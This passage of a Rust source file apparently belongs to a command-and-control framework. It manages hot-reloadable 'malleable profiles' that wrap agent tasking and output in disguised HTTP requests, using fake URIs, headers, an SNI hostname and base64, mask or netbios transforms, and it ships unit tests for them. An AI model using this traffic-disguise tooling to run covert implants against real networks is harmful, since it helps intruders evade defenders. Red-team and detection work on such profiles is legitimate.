            tracing::info!("malleable profile reloaded from {:?}", path);
            Ok(())
        } else {
            Err(anyhow!("no profile path set — cannot reload default profile"))
        }
    }

    /// Update the profile to a new file path and reload.
    pub async fn reload_from(&self, new_path: PathBuf) -> Result<()> {
        let new_profile = MalleableProfile::from_file(&new_path)?;
        let mut guard = self.profile.write().await;
        *guard = new_profile;
        tracing::info!("malleable profile reloaded from {:?}", new_path);
        Ok(())
    }

    /// Get the profile name.
    pub async fn profile_name(&self) -> String {
        let guard = self.profile.read().await;
        guard.profile.name.clone()
    }

    /// Get the configured SNI hostname.
    pub async fn sni_hostname(&self) -> String {
        let guard = self.profile.read().await;
        guard.ssl.sni.clone()
    }
}

// ── Multi-Profile Manager ────────────────────────────────────────────────────

/// Manages multiple malleable profiles simultaneously with hot-reload support.
///
/// The server can load multiple `.toml` profile files from a directory.
/// Each profile is keyed by its name. Listener bindings map to specific
/// profiles, and new sessions inherit the profile specified by the operator.
///
/// Hot-reload watches the profile directory for changes every 30 seconds.
/// New sessions use the updated profile immediately; existing sessions
/// continue using their session's profile snapshot.
#[derive(Debug, Clone)]
pub struct MultiProfileManager {
    /// Named profiles keyed by profile name.
    profiles: Arc<RwLock<HashMap<String, MalleableProfile>>>,
    /// Maps listener addresses to profile names.
    /// e.g., `"127.0.0.1:443"` → `"linkedin_profile"`
    listener_map: Arc<RwLock<HashMap<SocketAddr, String>>>,
    /// Per-session state store (shared with TransactionTransformer).
    sessions: Arc<RwLock<HashMap<String, SessionState>>>,
    /// Directory containing profile TOML files.
    profile_dir: Option<PathBuf>,
    /// File modification timestamps for hot-reload detection.
    file_timestamps: Arc<RwLock<HashMap<String, SystemTime>>>,
}

impl MultiProfileManager {
    /// Create an empty multi-profile manager.
    pub fn new() -> Self {
        Self {
            profiles: Arc::new(RwLock::new(HashMap::new())),
            listener_map: Arc::new(RwLock::new(HashMap::new())),
            sessions: Arc::new(RwLock::new(HashMap::new())),
            profile_dir: None,
            file_timestamps: Arc::new(RwLock::new(HashMap::new())),
        }
    }

    /// Load all `.toml` profiles from a directory.
    ///
    /// Each file must be a valid malleable profile TOML. Profiles are
    /// keyed by their `[profile] name` field. The directory is also
    /// stored for hot-reload support.
    pub fn load_from_dir(dir: &Path) -> Result<Self> {
        let mut manager = Self::new();
        manager.profile_dir = Some(dir.to_path_buf());

        let entries = std::fs::read_dir(dir)
            .with_context(|| format!("failed to read profile directory {:?}", dir))?;

        for entry in entries {
            let entry = entry?;
            let path = entry.path();
            if path.extension().and_then(|e| e.to_str()) == Some("toml") {
                match MalleableProfile::from_file(&path) {
                    Ok(profile) => {
                        let name = profile.profile.name.clone();
                        tracing::info!(
                            "loaded malleable profile '{}' from {:?}",
                            name,
                            path
                        );

                        // Record file modification time.
                        if let Ok(metadata) = std::fs::metadata(&path) {
                            if let Ok(modified) = metadata.modified() {
                                let mut ts = manager.file_timestamps.blocking_write();
                                ts.insert(path.to_string_lossy().to_string(), modified);
                            }
                        }

                        let mut profiles = manager.profiles.blocking_write();
                        profiles.insert(name, profile);
                    }
                    Err(e) => {
                        tracing::warn!("skipping profile {:?}: {}", path, e);
                    }
                }
            }
        }

        if manager.profiles.blocking_read().is_empty() {
            tracing::warn!("no valid profiles found in {:?}", dir);
        }

        Ok(manager)
    }

    /// Load from a single profile file (backward compat with `--profile`).
    pub fn load_from_file(path: &Path) -> Result<Self> {
        let profile = MalleableProfile::from_file(&path.to_path_buf())?;
        let name = profile.profile.name.clone();
        let mut manager = Self::new();

        // Record file modification time.
        if let Ok(metadata) = std::fs::metadata(path) {
            if let Ok(modified) = metadata.modified() {
                let mut ts = manager.file_timestamps.blocking_write();
                ts.insert(path.to_string_lossy().to_string(), modified);
            }
        }

        {
            let mut profiles = manager.profiles.blocking_write();
            profiles.insert(name, profile);
        }

        // Store the parent dir for potential future hot-reload.
        if let Some(parent) = path.parent() {
            manager.profile_dir = Some(parent.to_path_buf());
        }

        Ok(manager)
    }

    /// Get a profile by name.
    pub async fn get_profile(&self, name: &str) -> Option<MalleableProfile> {
        let guard = self.profiles.read().await;
        guard.get(name).cloned()
    }

    /// Get the first/default profile (useful when only one is loaded).
    pub async fn default_profile(&self) -> Option<MalleableProfile> {
        let guard = self.profiles.read().await;
        guard.values().next().cloned()
    }

    /// List all loaded profile names.
    pub async fn profile_names(&self) -> Vec<String> {
        let guard = self.profiles.read().await;
        guard.keys().cloned().collect()
    }

    /// Bind a listener address to a specific profile name.
    pub async fn bind_listener(&self, addr: SocketAddr, profile_name: &str) -> Result<()> {
        let profiles = self.profiles.read().await;
        if !profiles.contains_key(profile_name) {
            anyhow::bail!(
                "profile '{}' not found; available: {:?}",
                profile_name,
                profiles.keys().collect::<Vec<_>>()
            );
        }
        drop(profiles);
        let mut map = self.listener_map.write().await;
        map.insert(addr, profile_name.to_string());
        tracing::info!("bound {} → profile '{}'", addr, profile_name);
        Ok(())
    }

    /// Get the profile for a listener address.
    pub async fn profile_for_listener(&self, addr: &SocketAddr) -> Option<MalleableProfile> {
        let map = self.listener_map.read().await;
        let name = map.get(addr)?;
        let profiles = self.profiles.read().await;
        profiles.get(name).cloned()
    }

    /// Create a new agent session bound to a specific profile.
    ///
    /// The session gets a snapshot of the profile at creation time, so
    /// subsequent hot-reloads do not disrupt active sessions.
    pub async fn create_session(
        &self,
        profile_name: &str,
        session_id: &str,
    ) -> Result<()> {
        let profile = {
            let guard = self.profiles.read().await;
            guard
                .get(profile_name)
                .cloned()
                .ok_or_else(|| anyhow!("profile '{}' not found", profile_name))?
        };
        let state = SessionState::new(session_id.to_string(), &profile, profile_name);
        let mut sessions = self.sessions.write().await;
        sessions.insert(session_id.to_string(), state);
        tracing::debug!(
            "created session '{}' with profile '{}'",
            session_id,
            profile_name
        );
        Ok(())
    }

    /// Get a session by ID.
    pub async fn get_session(&self, session_id: &str) -> Option<SessionState> {
        // NOTE: SessionState has non-Clone fields (AtomicUsize, Instant),
        // so we can't easily clone it. For now, return a cloned profile snapshot.
        // A real implementation would return a guard or use interior mutability.
        let guard = self.sessions.read().await;
        guard.get(session_id).map(|s| SessionState {
            session_id: s.session_id.clone(),
            uri_index: AtomicUsize::new(s.uri_index.load(Ordering::Relaxed)),
            session_key: s.session_key.clone(),
            last_seen: s.last_seen,
            profile_snapshot: s.profile_snapshot.clone(),
            profile_name: s.profile_name.clone(),
        })
    }

    /// Touch a session's last-seen timestamp.
    pub async fn touch_session(&self, session_id: &str) {
        let mut sessions = self.sessions.write().await;
        if let Some(session) = sessions.get_mut(session_id) {
            session.last_seen = Instant::now();
        }
    }

    /// Get the shared session store Arc.
    pub fn session_store(&self) -> Arc<RwLock<HashMap<String, SessionState>>> {
        self.sessions.clone()
    }

    /// Check for profile file changes and reload any modified files.
    ///
    /// Returns the number of profiles that were reloaded.
    pub async fn hot_reload_check(&self) -> Result<usize> {
        let dir = match &self.profile_dir {
            Some(d) => d,
            None => return Ok(0),
        };

        let entries = std::fs::read_dir(dir)
            .with_context(|| format!("failed to read profile directory {:?}", dir))?;

        let mut reloaded = 0;
        let mut current_files: HashMap<String, SystemTime> = HashMap::new();

        for entry in entries {
            let entry = entry?;
            let path = entry.path();
            if path.extension().and_then(|e| e.to_str()) != Some("toml") {
                continue;
            }

            let path_str = path.to_string_lossy().to_string();
            let metadata = std::fs::metadata(&path)?;
            let modified = metadata.modified()?;

            current_files.insert(path_str.clone(), modified);

            let old_ts = {
                let ts = self.file_timestamps.read().await;
                ts.get(&path_str).copied()
            };

            let needs_reload = match old_ts {
                None => true,
                Some(old) => modified > old,
            };

            if needs_reload {
                match MalleableProfile::from_file(&path) {
                    Ok(profile) => {
                        let name = profile.profile.name.clone();
                        tracing::info!(
                            "hot-reloaded malleable profile '{}' from {:?}",
                            name,
                            path
                        );
                        let mut profiles = self.profiles.write().await;
                        profiles.insert(name, profile);
                        reloaded += 1;
                    }
                    Err(e) => {
                        tracing::warn!(
                            "hot-reload failed for {:?}: {}",
                            path,
                            e
                        );
                    }
                }
            }
        }

        // Update timestamps.
        {
            let mut ts = self.file_timestamps.write().await;
            *ts = current_files;
        }

        Ok(reloaded)
    }

    /// Start a background task that periodically checks for profile changes.
    ///
    /// The task runs every 30 seconds. New sessions will use the updated
    /// profile; existing sessions continue with their snapshot.
    pub fn start_hot_reload_task(self: &Arc<Self>) {
        let manager = Arc::clone(self);
        tokio::spawn(async move {
            let mut interval = tokio::time::interval(Duration::from_secs(30));
            loop {
                interval.tick().await;
                match manager.hot_reload_check().await {
                    Ok(n) if n > 0 => {
                        tracing::info!("hot-reload: {} profile(s) updated", n);
                    }
                    Ok(_) => {}
                    Err(e) => {
                        tracing::warn!("hot-reload check failed: {}", e);
                    }
                }
            }
        });
    }

    /// Get a transformer for a specific profile and transaction type.
    pub async fn get_transformer(
        &self,
        profile_name: &str,
        transaction_type: &str,
    ) -> Result<TransactionTransformer> {
        let profile = {
            let guard = self.profiles.read().await;
            guard
                .get(profile_name)
                .cloned()
                .ok_or_else(|| anyhow!("profile '{}' not found", profile_name))?
        };

        let config = match transaction_type {
            "http_get" => profile
                .http_get
                .clone()
                .ok_or_else(|| anyhow!("http_get not configured in profile '{}'", profile_name))?,
            "http_post" => profile
                .http_post
                .clone()
                .ok_or_else(|| anyhow!("http_post not configured in profile '{}'", profile_name))?,
            other => anyhow::bail!("unknown transaction type: {}", other),
        };

        Ok(TransactionTransformer::with_session_store(
            config,
            self.sessions.clone(),
        ))
    }

    /// Get a transformer for a listener address (resolves the profile first).
    pub async fn get_transformer_for_listener(
        &self,
        addr: &SocketAddr,
        transaction_type: &str,
    ) -> Result<TransactionTransformer> {
        let profile_name = {
            let map = self.listener_map.read().await;
            map.get(addr)
                .ok_or_else(|| anyhow!("no profile bound to {}", addr))?
                .clone()
        };
        self.get_transformer(&profile_name, transaction_type).await
    }
}

// ── Profile Validation ───────────────────────────────────────────────────────

/// Result of validating a malleable profile.
#[derive(Debug, serde::Serialize)]
pub struct ValidationReport {
    /// Path of the validated file.
    pub path: String,
    /// Profile name.
    pub name: String,
    /// Whether the profile is valid.
    pub valid: bool,
    /// Number of HTTP GET URIs configured.
    pub http_get_uris: usize,
    /// Number of HTTP POST URIs configured.
    pub http_post_uris: usize,
    /// DNS encoding mode.
    pub dns_encoding: String,
    /// Any warnings or issues found.
    pub warnings: Vec<String>,
    /// Round-trip test passed.
    pub roundtrip_ok: bool,
    /// Error message if validation failed.
    pub error: Option<String>,
}

/// Validate a malleable profile TOML file.
///
/// Parses the TOML, validates all fields, and runs a test transformation
/// round-trip to verify the transform pipeline is consistent.
pub fn validate_profile(path: &Path) -> ValidationReport {
    let path_str = path.to_string_lossy().to_string();

    // Step 1: Parse.
    let profile = match MalleableProfile::from_file(&path.to_path_buf()) {
        Ok(p) => p,
        Err(e) => {
            return ValidationReport {
                path: path_str,
                name: String::new(),
                valid: false,
                http_get_uris: 0,
                http_post_uris: 0,
                dns_encoding: String::new(),
                warnings: vec![],
                roundtrip_ok: false,
                error: Some(format!("parse error: {}", e)),
            };
        }
    };

    let name = profile.profile.name.clone();

    // Step 2: Validate fields.
    let mut warnings = Vec::new();
    if let Err(e) = profile.validate() {
        return ValidationReport {
            path: path_str,
            name,
            valid: false,
            http_get_uris: profile.http_get.as_ref().map(|g| g.uri.len()).unwrap_or(0),
            http_post_uris: profile.http_post.as_ref().map(|p| p.uri.len()).unwrap_or(0),
            dns_encoding: profile.dns.encoding.clone(),
            warnings: vec![],
            roundtrip_ok: false,
            error: Some(format!("validation error: {}", e)),
        };
    }

    // Collect informational warnings.
    let http_get_uris = profile.http_get.as_ref().map(|g| g.uri.len()).unwrap_or(0);
    let http_post_uris = profile.http_post.as_ref().map(|p| p.uri.len()).unwrap_or(0);

    if profile.global.jitter > 50 {
        warnings.push(format!(
            "high jitter ({}%) may cause noticeable timing variance",
            profile.global.jitter
        ));
    }
    if profile.ssl.cert_pin.is_empty() {
        warnings.push("no SSL certificate pin configured — agent will accept any cert".to_string());
    }
    if profile.global.user_agent.contains("Mozilla") {
        warnings.push("user agent looks like a real browser — consider a less common one".to_string());
    }
    if !matches!(
        profile.dns.encoding.as_str(),
        "hex" | "base32" | "base64url"
    ) {
        warnings.push(format!(
            "unusual DNS encoding '{}': expected hex, base32, or base64url",
            profile.dns.encoding
        ));
    }

    // Step 3: Round-trip test.
    let roundtrip_ok = test_roundtrip(&profile, &mut warnings);

    ValidationReport {
        path: path_str,
        name,
        valid: true,
        http_get_uris,
        http_post_uris,
        dns_encoding: profile.dns.encoding.clone(),
        warnings,
        roundtrip_ok,
        error: None,
    }
}

/// Run a transform round-trip test on a profile.
fn test_roundtrip(profile: &MalleableProfile, warnings: &mut Vec<String>) -> bool {
    let test_data = b"Hello, malleable profile round-trip test!";

    // Test http_get client direction.
    if let Some(ref get) = profile.http_get {
        let transformer = TransactionTransformer::new(get.clone());
        let encoded = transformer.encode_client(test_data);
        match transformer.decode_client(&encoded) {
            Ok(decoded) if decoded == test_data => {}
            Ok(decoded) => {
                warnings.push(format!(
                    "http_get client round-trip mismatch: {:?} != {:?}",
                    decoded, test_data
                ));
                return false;
            }
            Err(e) => {
                warnings.push(format!("http_get client round-trip decode failed: {}", e));
                return false;
            }
        }

        // Test server direction.
        let encoded = transformer.encode_server(test_data);
        match transformer.decode_server(&encoded) {
            Ok(decoded) if decoded == test_data => {}
            Ok(decoded) => {
                warnings.push(format!(
                    "http_get server round-trip mismatch: {:?} != {:?}",
                    decoded, test_data
                ));
                return false;
            }
            Err(e) => {
                warnings.push(format!("http_get server round-trip decode failed: {}", e));
                return false;
            }
        }
    }

    // Test http_post client direction.
    if let Some(ref post) = profile.http_post {
        let transformer = TransactionTransformer::new(post.clone());
        let encoded = transformer.encode_client(test_data);
        match transformer.decode_client(&encoded) {
            Ok(decoded) if decoded == test_data => {}
            Ok(decoded) => {
                warnings.push(format!(
                    "http_post client round-trip mismatch: {:?} != {:?}",
                    decoded, test_data
                ));
                return false;
            }
            Err(e) => {
                warnings.push(format!("http_post client round-trip decode failed: {}", e));
                return false;
            }
        }
    }

    true
}

// ── Tests ────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    const SAMPLE_PROFILE: &str = r#"
[profile]
name = "test_profile"
author = "tester"
description = "Test profile"

[profile.global]
user_agent = "TestAgent/1.0"
jitter = 10
sleep_time = 30

[profile.ssl]
enabled = true
sni = "cdn.test.com"

[profile.http_get]
uri = ["/api/v1/data", "/static/asset.js"]
verb = "GET"

[profile.http_get.headers]
"Accept" = "application/json"
"Cookie" = "sid={SESSIONID}"

[profile.http_get.client]
prepend = "HEADER_"
append = "_FOOTER"
transform = "base64"

[profile.http_get.server]
prepend = "RESP_"
append = "_END"
transform = "base64"

[profile.http_post]
uri = ["/api/v1/upload"]
verb = "POST"

[profile.http_post.headers]
"Content-Type" = "application/octet-stream"

[profile.http_post.client]
prepend = ""
append = ""
transform = "base64"

[profile.http_post.server]
prepend = ""
append = ""
transform = "none"

[profile.dns]
enabled = false
"#;

    #[test]
    fn parse_server_profile() {
        let profile = MalleableProfile::from_toml(SAMPLE_PROFILE).unwrap();
        assert_eq!(profile.profile.name, "test_profile");
        assert_eq!(profile.global.jitter, 10);
        assert_eq!(profile.ssl.sni, "cdn.test.com");

        let get = profile.http_get.as_ref().unwrap();
        assert_eq!(get.uri.len(), 2);
        assert!(get.headers.contains_key("Cookie"));
    }

    #[test]
    fn transformer_encode_decode_client() {
        let profile = MalleableProfile::from_toml(SAMPLE_PROFILE).unwrap();
        let get_cfg = profile.http_get.as_ref().unwrap().clone();
        let transformer = TransactionTransformer::new(get_cfg);

        let payload = b"hello from agent";
        let encoded = transformer.encode_client(payload);
        assert!(encoded.starts_with(b"HEADER_"));
        assert!(encoded.ends_with(b"_FOOTER"));

        let decoded = transformer.decode_client(&encoded).unwrap();
        assert_eq!(decoded, payload);
    }

    #[test]
    fn transformer_encode_decode_server() {
        let profile = MalleableProfile::from_toml(SAMPLE_PROFILE).unwrap();
        let get_cfg = profile.http_get.as_ref().unwrap().clone();
        let transformer = TransactionTransformer::new(get_cfg);

        let payload = b"task data from server";
        let encoded = transformer.encode_server(payload);
        assert!(encoded.starts_with(b"RESP_"));
        assert!(encoded.ends_with(b"_END"));

        let decoded = transformer.decode_server(&encoded).unwrap();
        assert_eq!(decoded, payload);
    }

    #[test]
    fn transformer_post_roundtrip() {
        let profile = MalleableProfile::from_toml(SAMPLE_PROFILE).unwrap();
        let post_cfg = profile.http_post.as_ref().unwrap().clone();
        let transformer = TransactionTransformer::new(post_cfg);

        let payload = b"output data";
        let encoded = transformer.encode_client(payload);
        let decoded = transformer.decode_client(&encoded).unwrap();
        assert_eq!(decoded, payload);
    }

    #[test]
    fn default_profile_valid() {
        let profile = MalleableProfile::default();
        profile.validate().unwrap();
    }

    #[test]
    fn profile_manager_get_transformer() {
        let rt = tokio::runtime::Runtime::new().unwrap();
        rt.block_on(async {
            let profile = MalleableProfile::from_toml(SAMPLE_PROFILE).unwrap();
            let mgr = ProfileManager::new(profile);

            let t_get = mgr.get_transformer("http_get").await.unwrap();
            assert_eq!(t_get.verb(), "GET");

            let t_post = mgr.get_transformer("http_post").await.unwrap();
            assert_eq!(t_post.verb(), "POST");

            let err = mgr.get_transformer("http_put").await;
            assert!(err.is_err());
        });
    }

    #[test]
    fn profile_manager_missing_transaction() {
        let rt = tokio::runtime::Runtime::new().unwrap();
        rt.block_on(async {
            // Create a profile with only http_get.
            let mut profile = MalleableProfile::default();
            profile.http_post = None;
            let mgr = ProfileManager::new(profile);

            let err = mgr.get_transformer("http_post").await;
            assert!(err.is_err());
        });
    }

    #[test]
    fn transformer_build_headers() {
        let profile = MalleableProfile::from_toml(SAMPLE_PROFILE).unwrap();
        let get_cfg = profile.http_get.as_ref().unwrap().clone();
        let transformer = TransactionTransformer::new(get_cfg);

        let headers = transformer.build_headers("my-session-123");
        assert_eq!(headers.get("Cookie").unwrap(), "sid=my-session-123");
        assert_eq!(headers.get("Accept").unwrap(), "application/json");
    }

    #[test]
    fn transformer_random_uri() {
        let profile = MalleableProfile::from_toml(SAMPLE_PROFILE).unwrap();
        let get_cfg = profile.http_get.as_ref().unwrap().clone();
        let transformer = TransactionTransformer::new(get_cfg);

        for _ in 0..20 {
            let uri = transformer.random_uri();
            assert!(uri == "/api/v1/data" || uri == "/static/asset.js");
        }
    }

    #[test]
    fn profile_validation_rejects_no_transactions() {
        let mut profile = MalleableProfile::default();
        profile.http_get = None;
        profile.http_post = None;
        assert!(profile.validate().is_err());
    }

    #[test]
    fn profile_validation_rejects_empty_uris() {
        let mut profile = MalleableProfile::default();
        profile.http_get.as_mut().unwrap().uri.clear();
        assert!(profile.validate().is_err());
    }

    #[test]
    fn profile_validation_rejects_bad_jitter() {
        let mut profile = MalleableProfile::default();
        profile.global.jitter = 200;
        assert!(profile.validate().is_err());
    }

    #[test]
    fn mask_transform_roundtrip() {
        let cfg = HttpTransactionConfig {
            uri: vec!["/test".to_string()],
            verb: "POST".to_string(),
            headers: HashMap::new(),
            uri_append: None,
            client: HttpTransformConfig {
                prepend: String::new(),
                append: String::new(),
                transform: TransformType::Mask,
                mask_stride: 0x37,
            },
            server: HttpTransformConfig::default(),
            metadata: None,
            output: None,
        };
        let transformer = TransactionTransformer::new(cfg);
        let payload = b"mask test data";
        let encoded = transformer.encode_client(payload);
        assert_ne!(encoded, payload);
        let decoded = transformer.decode_client(&encoded).unwrap();
        assert_eq!(decoded, payload);
    }

    #[test]
    fn netbios_transform_roundtrip() {
        let cfg = HttpTransactionConfig {
            uri: vec!["/test".to_string()],
            verb: "GET".to_string(),
            headers: HashMap::new(),
            uri_append: None,
            client: HttpTransformConfig {
                prepend: String::new(),
                append: String::new(),
                transform: TransformType::Netbios,
                mask_stride: 0,
            },
            server: HttpTransformConfig::default(),
            metadata: None,
            output: None,
        };
        let transformer = TransactionTransformer::new(cfg);
        let payload = b"\x01\x23\xab\xcd";
        let encoded = transformer.encode_client(payload);
        assert_eq!(encoded.len(), payload.len() * 2);
        let decoded = transformer.decode_client(&encoded).unwrap();
        assert_eq!(decoded, payload);
    }
}
